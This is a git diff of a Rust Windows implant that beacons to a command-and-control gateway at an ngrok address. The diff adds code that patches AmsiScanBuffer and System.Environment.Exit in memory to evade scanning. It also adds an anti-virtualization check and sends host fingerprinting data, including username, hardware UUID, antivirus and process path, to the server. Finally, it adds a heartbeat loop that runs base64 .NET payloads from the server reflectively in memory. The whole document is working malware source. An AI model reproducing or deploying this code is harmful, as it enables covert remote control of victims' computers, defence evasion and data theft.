@@ -1,7 +1,7 @@
 extern crate colored; 
 
 use std::{
-    borrow::Borrow, fmt::format, fs::{self, File}, io::Write, net::IpAddr, path::Path, process::{exit, Command}, str, string, sync::{Arc, RwLock}, time::{SystemTime, UNIX_EPOCH}
+   process::exit, str, time::{SystemTime, UNIX_EPOCH}
 };
 
 use std::thread;
@@ -20,12 +20,10 @@ use crypto::{ symmetriccipher, buffer, aes, blockmodes };
 use crypto::buffer::{ ReadBuffer, WriteBuffer, BufferResult };
 
 use colored::Colorize;
-use lazy_static::lazy_static;
 use crate::serde_json::json;
 use serde_json;
 use sha256;
 use rand;
-use std::io::prelude::*;
 
 use wmi::*;
 use std::collections::HashMap;
@@ -39,13 +37,37 @@ use argon2::{
     Argon2
 };
 
+use rspe::{reflective_loader, utils::check_dotnet};
 use itertools::Itertools;
 use rand::RngCore;
 
+use clroxide::{clr::Clr, primitives::wrap_unknown_ptr_in_variant};
+use std::{ffi::c_void, fs, mem::size_of, ptr, slice};
+use windows::Win32::System::{
+    Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
+};
 
-const CONNECTION_INTERVAL: u64 = 300;
+use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
+use windows::Win32::System::Threading::GetCurrentProcess;
+
+use windows::core::{ s, w };
+use windows::Win32::System::LibraryLoader::{ LoadLibraryW, GetProcAddress };
+use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
+
+extern crate kernel32;
+extern crate winapi;
+use std::ptr::null_mut;
+
+use serde::Deserialize;  
+
+#[derive(Deserialize, Debug)]  
+pub struct Win32BIOS {  
+    pub serialnumber: String,  
+}  
+
+const CONNECTION_INTERVAL: u64 = 30;
 const ANTI_VIRTUAL: bool = false;
-const GATEWAY_PATH: &str = "http://127.0.0.1:9999/gateway";
+const GATEWAY_PATH: &str = "https://4c7a-169-150-203-56.ngrok-free.app/gateway";
 const SERVER_RSA_PUB: &str = "
 -----BEGIN RSA PUBLIC KEY-----
 MIIBCgKCAQEAx+zN1dr6iV1Upyd9ixoG2gxvupYqIeuFMV0GgWcCK91pcPZCkeQG
@@ -63,16 +85,139 @@ xs9LxVype+cEoOSfpawaAH71Kw+d40Dp7wIDAQAB
 // Another loop in another thread will go through each item in the global vec, and complete the task.
 // After the task is completed, it will send a "submit_output" request to the server.
 
-fn parse_wmi(input: &Variant) -> String {
-    let formatted = format!("{:?}", input);
-    let start_index = formatted.find('(').unwrap_or(formatted.len());
-    let end_index = formatted.rfind(')').unwrap_or(start_index);
-    let extracted = &formatted[start_index + 1..end_index];
-    extracted.replace("\\", "").replace("\"", "").into()
+
+fn main() {
+
+    colored::control::set_virtual_terminal(true).unwrap();
+
+    unsafe {
+        let mut clr = Clr::context_only(None).unwrap();
+
+        let context = clr.get_context().unwrap();
+        let app_domain = context.app_domain;
+        let mscorlib = (*app_domain).load_library("mscorlib").unwrap();
+
+        let environment = (*mscorlib).get_type("System.Environment").unwrap();
+        let exit_fn = (*environment).get_method("Exit").unwrap();
+        let method_info: *mut clroxide::primitives::_Type = (*mscorlib).get_type("System.Reflection.MethodInfo").unwrap();
+        let method_handle = (*method_info).get_property("MethodHandle").unwrap();
+        let exit_fn_instance = wrap_unknown_ptr_in_variant(exit_fn as *mut c_void);
+        let method_handle_value = (*method_handle).get_value(Some(exit_fn_instance)).unwrap();
+        let runtime_method_handle = (*mscorlib).get_type("System.RuntimeMethodHandle").unwrap();
+        let get_func_pointer = (*runtime_method_handle).get_method("GetFunctionPointer").unwrap();
+        let pointer_variant = (*get_func_pointer).invoke_without_args(Some(method_handle_value)).unwrap();
+
+        let base_ptr = pointer_variant.Anonymous.Anonymous.Anonymous.byref;
+        let exit_ptr = pointer_variant.Anonymous.Anonymous.Anonymous.byref;
+
+        let value = ptr::read(exit_ptr as *mut u8);
+        fprint("info", &format!("`System.Environment.Exit` is: `0x{:x}`", value));
+
+        let mut old: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
+        let mut restored: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
+
+        fprint("info", "Patching `System.Environment.Exit");
+
+        if !VirtualProtect(base_ptr as *const c_void, 1, PAGE_READWRITE, &mut old).is_ok() {
+            fprint("error", "Unable to change memory permissions at the function pointer for `System.Environment.Exit`");
+        }
+
+        ptr::write(exit_ptr as *mut u8, 0xc3);
+
+        let value = ptr::read(exit_ptr as *mut u8);
+        fprint("success", &format!("`System.Environment.Exit` was patched to: `0x{:x}`",value));
+
+        if !VirtualProtect(base_ptr as *const c_void, 1, old, &mut restored).is_ok() {
+            fprint("error", "Unable to change memory permissions at the function pointer back to the original value");
+        }
+
+
+
+        let result = LoadLibraryW(w!("C:\\Windows\\System32\\amsi.dll"));
+       
+        let farproc = GetProcAddress(result.unwrap(), s!("AmsiScanBuffer"));
+        if farproc.is_none() {
+            println!("Failed to get function address 'AmsiScanString'");
+        }
+    
+        //println!("AmsiScanString address: {:?}", farproc.unwrap());
+    
+        let mut ppf = PAGE_PROTECTION_FLAGS(0);
+        let r1 = VirtualProtect(
+                farproc.unwrap() as usize as *const c_void,
+                3,
+                PAGE_EXECUTE_READWRITE,
+                &mut ppf as *mut PAGE_PROTECTION_FLAGS,
+            );
+        if r1.is_err() {
+            println!("Failed to modify protect flag");
+        }
+    
+        //println!("farproc: {:?}", farproc.unwrap());
+    
+        let patch: [u8;3] = [0x33,0xc0,0xc3];
+        let mut written_size: usize = 0;
+        let re = WriteProcessMemory(
+            GetCurrentProcess(),
+            farproc.unwrap() as *const c_void,
+            patch.as_ptr() as *const c_void,
+            3,
+            Some(&mut written_size as *mut usize),
+        );
+
+        if re.is_err() {
+            println!("Failed to patch");
+        }
+    };
+
+    anti_virtualization();
+    let (client_id, encryption_key) = init_connection();
+    let handle = thread::spawn(move || {
+        heartbeat_loop(client_id, encryption_key) // Use global rwlock here later
+    });
+    handle.join().unwrap();
+    // If the main heartbeat loop encounters a task, add it to a global vec. Another thread will complete that task and submit the output, and remove it from the global vec.
+    // The main heartbeat loop doesn't ever read this vec, so a rece condition will never occur.
+
+    // REFACTOR CODE. IT IS UGLY AS SHIT RIGHT NOW.
 }
 
-fn heartbeat_loop(client_id: String, encryption_key: String) {
+// Block program exit. Program exits after running the shits. 
+// Might have to write custom ones and load them into a new process, or find way to patch exit.
+
+fn submit_output(client_id: &str, command_id: &str, output: &str, encryption_key: &str) {
+    let combined = format!("{}.{}", 
+        client_id, 
+        aes_256cbc_encrypt(&json!({
+            "action": "submit_output",
+            "command_id": command_id,
+            "output": output
+        }).to_string(), encryption_key.as_bytes()).unwrap()
+    );
+
+    match ureq::post(GATEWAY_PATH).send_string(&combined) {
+        Ok(result) => {
+            fprint("success", &format!("Output submitted successfully: {}", output));
+            result.into_string().unwrap()
+        },
+        Err(error) => {
+            fprint("error", &format!("Unable to submit output to the server. Error: {}", error));
+            return;
+        }
+    };
+}
+
+
+
+fn heartbeat_loop(client_id_intake: String, encryption_key_intake: String) {
+
+    // Use arc rwlocks later
+    let mut client_id = client_id_intake.clone();
+    let mut encryption_key = encryption_key_intake.clone();
+    
     loop {
+        thread::sleep(Duration::from_millis(CONNECTION_INTERVAL * 1000));
+
         let combined = format!("{}.{}", 
             client_id, 
             aes_256cbc_encrypt(&json!({
@@ -81,28 +226,78 @@ fn heartbeat_loop(client_id: String, encryption_key: String) {
             encryption_key.as_bytes()).unwrap()
         );
 
-        match ureq::post(GATEWAY_PATH).send_string(&combined) {
+        let result = match ureq::post(GATEWAY_PATH).send_string(&combined) {
             Ok(result) => {
-                fprint("success", &format!("Connection established with {}", GATEWAY_PATH.yellow()));
+                fprint("heartbeat", "Heartbeat sent.");
                 result.into_string().unwrap()
             },
             Err(error) => {
-                fprint("error", &format!("Unable to initialize handshake with server. Error: {}", error));
-                exit(1);
+                fprint("error", &format!("Unable to send a heartbeat to the server. Error: {}", error));
+                (client_id, encryption_key) = init_connection();
+                continue
+                
             }
         };
-        thread::sleep(Duration::from_millis(CONNECTION_INTERVAL * 1000));
+
+        let decrypted_response = match aes_256cbc_decrypt(&result, encryption_key.as_bytes()) {
+            Ok(result) => result,
+            Err(_) => {
+                fprint("error", &format!("Server responded with undecrypteable response, which was: {}", result));
+                (client_id, encryption_key) = init_connection();
+                continue;
+                
+            }
+        };
+
+        match str::from_utf8(&decrypted_response).unwrap() {
+            "Ok" => {continue},
+            _ => ()
+        };
+
+        let mut client_id = client_id.clone();
+        let mut encryption_key = encryption_key.clone();
+
+        let decrypted_response_json = match serde_json::from_slice::<serde_json::Value>(&decrypted_response) {
+            Ok(result) => result,
+            Err(_) => {
+                fprint("error", "Unable to convert decrypted response into json.");
+                (client_id, encryption_key) = init_connection();
+                continue
+            }
+        };
+
+        thread::spawn(move || {
+          
+            match key_to_string(&decrypted_response_json, "cmd_type").as_str() {
+                "DOTNET Execution" => {
+                    let payload_bytes = BASE64_STANDARD.decode(key_to_string(&decrypted_response_json, "cmd_args")).unwrap();
+                    unsafe {
+                        if check_dotnet(payload_bytes.clone()) {
+                            patched_clr_run(&client_id, &key_to_string(&decrypted_response_json, "command_id"), &encryption_key, payload_bytes, vec![]);
+                        } else {
+                            submit_output(
+                                &client_id, &key_to_string(&decrypted_response_json, "command_id"), 
+                                "Executable is not a DOTNET. Unable to proceed.", 
+                                &encryption_key
+                            )
+                        }
+                    }
+                },
+
+                unsupported_command => {
+                    fprint("failure", &format!("Unsupported Command: {}", unsupported_command));
+                    submit_output(
+                        &client_id, &key_to_string(&decrypted_response_json, "command_id"), 
+                        "This client doesn't have support for this command.", 
+                        &encryption_key
+                    )
+                }
+            };
+         });       
     }
 }
 
 fn anti_virtualization() {
-
-    use serde::Deserialize;  
-
-    #[derive(Deserialize, Debug)]  
-    pub struct Win32BIOS {  
-        pub serialnumber: String,  
-    }  
 
     let com_con = COMLibrary::new().unwrap();  
     let wmi_con = WMIConnection::new(com_con.into()).unwrap();  
@@ -126,8 +321,11 @@ fn anti_virtualization() {
   
 }
 
+// Check if the connection interval is up before updating a client. If it is, don't let their ass in.
+
 fn init_connection() -> (String, String) {
 
+    thread::sleep(Duration::from_millis(CONNECTION_INTERVAL * 1000));
     let wmi_con = WMIConnection::new(COMLibrary::new().unwrap()).unwrap();
 
     let proccess_id = process::id();
@@ -149,6 +347,20 @@ fn init_connection() -> (String, String) {
         }
     };
 
+    let guid: String = match wmi_con.raw_query::<HashMap<String, Variant>>("SELECT UUID FROM Win32_ComputerSystemProduct") {
+        Ok(results) => {
+            results.iter().map(|os| 
+                parse_wmi(&os["UUID"])
+            ).collect::<Vec<_>>().join("")
+        }, 
+
+        Err(error) => {
+            fprint("error", &format!("Couldn't get GUID. Error: {:?} ", error));
+            terminate_and_block();
+            "N/A".to_string()
+        }
+    };
+    
     let gpu: String = match wmi_con.raw_query::<HashMap<String, Variant>>("SELECT name FROM Win32_VideoController") {
         Ok(results) => {
             results.iter().map(|os| 
@@ -204,98 +416,101 @@ fn init_connection() -> (String, String) {
             "N/A".to_string()
         }
     };
+    
+    loop {
+        thread::sleep(Duration::from_millis(5000));
+        let client_bytes = random_bytes(32);
+        let mut rng = rand::thread_rng();
+        let server_pub_rsa = RsaPublicKey::from_pkcs1_pem(&SERVER_RSA_PUB).unwrap();
+        let rsa_client_bytes = BASE64_STANDARD.encode(server_pub_rsa.encrypt(&mut rng, Pkcs1v15Encrypt, &client_bytes).unwrap());
 
-    let client_bytes = random_bytes(32);
-    let mut rng = rand::thread_rng();
-    let server_pub_rsa = RsaPublicKey::from_pkcs1_pem(&SERVER_RSA_PUB).unwrap();
-    let rsa_client_bytes = BASE64_STANDARD.encode(server_pub_rsa.encrypt(&mut rng, Pkcs1v15Encrypt, &client_bytes).unwrap());
+        let server_response = match ureq::post(GATEWAY_PATH).send_string(&rsa_client_bytes) {
+            Ok(result) => {
+                fprint("success", &format!("Connection established with {}", GATEWAY_PATH.yellow()));
+                result.into_string().unwrap()
+            },
+            Err(error) => {
+                fprint("error", &format!("Unable to initialize handshake with server. Error: {}", error));
+                continue;
+            }
+        };
 
-    let server_response = match ureq::post(GATEWAY_PATH).send_string(&rsa_client_bytes) {
-        Ok(result) => {
-            fprint("success", &format!("Connection established with {}", GATEWAY_PATH.yellow()));
-            result.into_string().unwrap()
-        },
-        Err(error) => {
-            fprint("error", &format!("Unable to initialize handshake with server. Error: {}", error));
-            exit(1);
-        }
-    };
+        let raw_server_json: Vec<u8> = match aes_256cbc_decrypt(&server_response, &client_bytes) {
+            Ok(result) => result,
+            Err(error) => {
+                fprint("error", &format!("Server response not encrypted properly. Response: {} | Error: {:?}", &server_response, error));
+                continue;
+            }
+        };
 
-    let raw_server_json: Vec<u8> = match aes_256cbc_decrypt(&server_response, &client_bytes) {
-        Ok(result) => result,
-        Err(error) => {
-            fprint("error", &format!("Server response not encrypted properly. Response: {} | Error: {:?}", &server_response, error));
-            exit(1);
-        }
-    };
+        let parsed_server_json = match serde_json::from_slice::<serde_json::Value>(&raw_server_json) {
+            Ok(result) => result,
+            Err(error) => {
+                fprint("error", &format!("Couldn't convert server raw json into parsed json. Json: {:?} | Error: {:?}", &raw_server_json, &error));
+                continue;
+            }
+        };
 
-    let parsed_server_json = match serde_json::from_slice::<serde_json::Value>(&raw_server_json) {
-        Ok(result) => result,
-        Err(error) => {
-            fprint("error", &format!("Couldn't convert server raw json into parsed json. Json: {:?} | Error: {:?}", &raw_server_json, &error));
-            exit(1);
-        }
-    };
+        fprint("task", &format!("Cracking {}", &parsed_server_json["hash"]));
 
-    fprint("task", &format!("Cracking {}", &parsed_server_json["hash"]));
+        let start_time = get_timestamp();
+        let server_seed = BASE64_STANDARD.decode(key_to_string(&parsed_server_json, "seed")).unwrap();
+        let server_hash = key_to_string(&parsed_server_json, "hash");
+        let mut server_bytes: Vec<u8> = vec![];
 
-    let start_time = get_timestamp();
-    let server_seed = BASE64_STANDARD.decode(key_to_string(&parsed_server_json, "seed")).unwrap();
-    let server_hash = key_to_string(&parsed_server_json, "hash");
-    let mut server_bytes: Vec<u8> = vec![];
+        for perm in server_seed.iter().permutations(server_seed.len()).unique() {
+            let mut temp = vec![];
+            for byte in perm { temp.push(*byte); }
 
-    for perm in server_seed.iter().permutations(server_seed.len()).unique() {
-        let mut temp = vec![];
-        for byte in perm { temp.push(*byte); }
+            if verify_argon2(&server_hash, &temp) {
+                server_bytes = temp;
+                break;
+            }
+        }      
 
-        if verify_argon2(&server_hash, &temp) {
-            server_bytes = temp;
-            break;
-        }
-    }      
+        let encryption_key =  sha256::digest([client_bytes.clone(), server_bytes.clone()].concat())[..32].to_string();
 
-    let encryption_key =  sha256::digest([client_bytes.clone(), server_bytes.clone()].concat())[..32].to_string();
-
-    fprint("success", &format!("Generated encryption key in {}s: {}", {
-        get_timestamp() - start_time
-    }, encryption_key.yellow()));
+        fprint("success", &format!("Generated encryption key in {}s: {}", {
+            get_timestamp() - start_time
+        }, encryption_key.yellow()));
 
 
-    let rsaed_encryption_key = BASE64_STANDARD.encode(server_pub_rsa.encrypt(&mut rng, Pkcs1v15Encrypt, &encryption_key.as_bytes()).unwrap());
-    let registration_payload = aes_256cbc_encrypt(&json!({
-        "version": 10,
-        "uac": false,
-        "username": username,
-        "guid": "windows_guid", // WMI
-        "cpu": cpu,
-        "gpu": gpu,
-        "ram": ram,
-        "antivirus": antivirus,
-        "path": proccess_path,
-        "pid": proccess_id,
-    }).to_string(), encryption_key.as_bytes()).unwrap();
+        let rsaed_encryption_key = BASE64_STANDARD.encode(server_pub_rsa.encrypt(&mut rng, Pkcs1v15Encrypt, &encryption_key.as_bytes()).unwrap());
+        let registration_payload = aes_256cbc_encrypt(&json!({
+            "version": 10,
+            "uac": false,
+            "username": username,
+            "guid": guid,
+            "cpu": cpu,
+            "gpu": gpu,
+            "ram": ram,
+            "antivirus": antivirus,
+            "path": proccess_path,
+            "pid": proccess_id,
+        }).to_string(), encryption_key.as_bytes()).unwrap();
 
-    let combined = format!("{}.{}", rsaed_encryption_key, registration_payload);
-    let registration_response = match ureq::post(GATEWAY_PATH).send_string(&combined) {
-        Ok(result) => {
-            result.into_string().unwrap()
-        },
-        Err(error) => {
-            fprint("error", &format!("Unable to submit registration. Error: {}", error));
-            exit(1);
-        }
-    };
+        let combined = format!("{}.{}", rsaed_encryption_key, registration_payload);
+        let registration_response = match ureq::post(GATEWAY_PATH).send_string(&combined) {
+            Ok(result) => {
+                result.into_string().unwrap()
+            },
+            Err(error) => {
+                fprint("error", &format!("Unable to submit registration. Error: {}", error));
+                continue;
+            }
+        };
 
-    let client_id = match aes_256cbc_decrypt(&registration_response, encryption_key.as_bytes()) {
-        Ok(result) => String::from_utf8(result).unwrap(),
-        Err(error) => {
-            fprint("error", &format!("Unable to decrypt registration response. Error: {:?} | Raw Response: {}", error, registration_response));
-            exit(1);
-        }
-    };
+        let client_id = match aes_256cbc_decrypt(&registration_response, encryption_key.as_bytes()) {
+            Ok(result) => String::from_utf8(result).unwrap(),
+            Err(error) => {
+                fprint("error", &format!("Unable to decrypt registration response. Error: {:?} | Raw Response: {}", error, registration_response));
+                continue;
+            }
+        };
 
-    fprint("info", &format!("Obtained client id {}", &client_id.yellow()));
-    return (client_id, encryption_key);
+        fprint("info", &format!("Obtained client id {}", &client_id.yellow()));
+        return (client_id, encryption_key);
+    }
 
 }
 
@@ -303,22 +518,6 @@ fn terminate_and_block() {
     if !ANTI_VIRTUAL {return}
     drop(ureq::get(GATEWAY_PATH).call());
     exit(1);
-}
-
-fn main() {
-    colored::control::set_virtual_terminal(true).unwrap();
-    anti_virtualization();
-
-    let (client_id, encryption_key) = init_connection();
-    let handle = thread::spawn(move || {
-        heartbeat_loop(client_id, encryption_key) // Use global rwlock here later
-    });
-    handle.join().unwrap();
-
-    // If the main heartbeat loop encounters a task, add it to a global vec. Another thread will complete that task and submit the output, and remove it from the global vec.
-    // The main heartbeat loop doesn't ever read this vec, so a rece condition will never occur.
-
-    // REFACTOR CODE. IT IS UGLY AS SHIT RIGHT NOW.
 }
 
 fn get_timestamp() -> u64 {
@@ -329,8 +528,20 @@ fn get_timestamp() -> u64 {
 }
 
 
-// TODO :BUFFER TOO SMALL
+unsafe fn patched_clr_run(client_id: &str, command_id: &str, encryption_key: &str, contents: Vec<u8>, args: Vec<String>) -> () {
+    let mut clr = Clr::new(contents, args).unwrap();
 
+    submit_output(&client_id, command_id, 
+        "Executable reached last stage before execution. Assumed success.",
+        &encryption_key
+    );
+
+    clr.run().unwrap();
+}
+
+
+// unreachable :BUFFER TOO SMALL
+// ohiohoiHDOH12OID
 fn aes_256cbc_encrypt(data: &str, key: &[u8]) -> core::result::Result<String, symmetriccipher::SymmetricCipherError> {
 
     let mut encryptor = aes::cbc_encryptor(
@@ -345,7 +556,7 @@ fn aes_256cbc_encrypt(data: &str, key: &[u8]) -> core::result::Result<String, sy
     let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);
 
     loop {
-        let result = encryptor.encrypt(&mut read_buffer, &mut write_buffer, true)?;
+        let result = encryptor.encrypt(&mut read_buffer, &mut write_buffer, true).unwrap();
 
         final_result.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));
 
@@ -373,7 +584,7 @@ fn aes_256cbc_decrypt(encrypted_data: &str, key: &[u8]) -> core::result::Result<
     let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);
 
     loop {
-        let result = decryptor.decrypt(&mut read_buffer, &mut write_buffer, true)?;
+        let result = decryptor.decrypt(&mut read_buffer, &mut write_buffer, true).unwrap();
         final_result.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));
         match result {
             BufferResult::BufferUnderflow => break,
@@ -425,4 +636,13 @@ pub fn random_bytes(len: usize) -> Vec<u8> {
     let mut buffer = vec![0; len];
     rand::thread_rng().fill_bytes(&mut buffer);
     buffer[..].to_vec()
+}
+
+
+fn parse_wmi(input: &Variant) -> String {
+    let formatted = format!("{:?}", input);
+    let start_index = formatted.find('(').unwrap_or(formatted.len());
+    let end_index = formatted.rfind(')').unwrap_or(start_index);
+    let extracted = &formatted[start_index + 1..end_index];
+    extracted.replace("\\", "").replace("\"", "").into()
 }
